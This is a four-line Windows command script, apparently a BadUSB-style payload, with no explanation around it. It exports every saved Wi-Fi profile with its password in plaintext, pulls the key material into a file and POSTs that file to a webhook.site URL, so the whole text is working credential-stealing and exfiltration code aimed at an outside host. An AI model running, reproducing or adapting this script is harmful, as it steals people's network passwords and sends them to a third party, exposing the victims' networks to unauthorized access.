cd "$env:LOCALAPPDATA"
netsh wlan export profile key=clear                                                         
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS                  
powershell Invoke-WebRequest -InFile Wi-Fi-PASS -Uri https://webhook.site/1effb288-1ed1-40f4-a479-1e07b5fa764e -Method POST
